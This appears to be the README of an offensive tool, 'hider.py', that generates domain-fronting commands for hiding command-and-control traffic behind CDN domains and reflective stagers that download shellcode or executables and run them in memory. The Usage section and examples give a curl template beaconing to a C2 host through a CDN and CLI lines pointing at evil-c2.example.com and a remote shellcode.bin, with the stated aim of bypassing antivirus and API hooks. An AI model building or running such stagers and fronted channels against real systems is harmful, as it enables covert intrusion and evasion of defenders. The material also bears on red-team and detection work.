# Domain Fronting and Reflective Loaders

## 1. Concept: What is it?

### Domain Fronting
Domain fronting is a technique to hide the true destination of C2 (Command & Control) traffic. It exploits a quirk in Content Delivery Networks (CDNs) like CloudFront or Azure. 

The attacker initiates a TLS (HTTPS) connection to a highly reputable, universally trusted CDN domain (e.g., `legit.cloudfront.net`). However, inside the encrypted HTTP request, the `Host:` header is set to the attacker's actual C2 server (e.g., `evil-c2.example.com`). Protective network filters see the trusted connection to the CDN, but the CDN routes the traffic to the attacker.

### Reflective Loaders
A Reflective Loader executes an executable file (PE/DLL/Assembly) entirely within memory. It never touches disk (bypassing File System AV scans) and does not rely on the Windows OS loader (bypassing specific load-image API hooks).

## 2. Implementation: How does it work?

### `front_engine.py` (Domain Fronting)
Generates command syntaxes (`curl`, `Invoke-WebRequest`, or raw HTTP strings) that deliberately misalign the Server Name Indication (SNI) and the HTTP Host header. 
* E.g., `curl -sk --resolve "[CDN]:443:IP" -H "Host: [C2_DOMAIN]" "https://[CDN]/beacon"`

### `loader_engine.py` (Reflective Stagers)
Generates download cradles (stagers) that fetch shellcode or executables over the network and inject them directly into memory.
* **Windows (Shellcode):** Uses `VirtualAlloc` to provision `PAGE_EXECUTE_READWRITE` memory, copies the shellcode byte array into it, and triggers it with `CreateThread`.
* **Windows (PE):** Downloads a compiled `.NET` executable and uses `[Reflection.Assembly]::Load()` to invoke its entry point natively.
* **Linux (memfd):** Downloads an ELF binary and creates an anonymous, in-memory file descriptor (`memfd_create()`), executing it via `/proc/self/fd/`.

## 3. Usage
**CLI Command:**
```bash
# Generate Domain Fronting payloads
python3 hider.py front --real evil-c2.example.com --front d12ab34.cloudfront.net --path /beacon

# Generate a Windows VirtualAlloc Shellcode Stager
python3 hider.py loader --url http://c2/shellcode.bin --platform windows --type shellcode --out stager.ps1
```
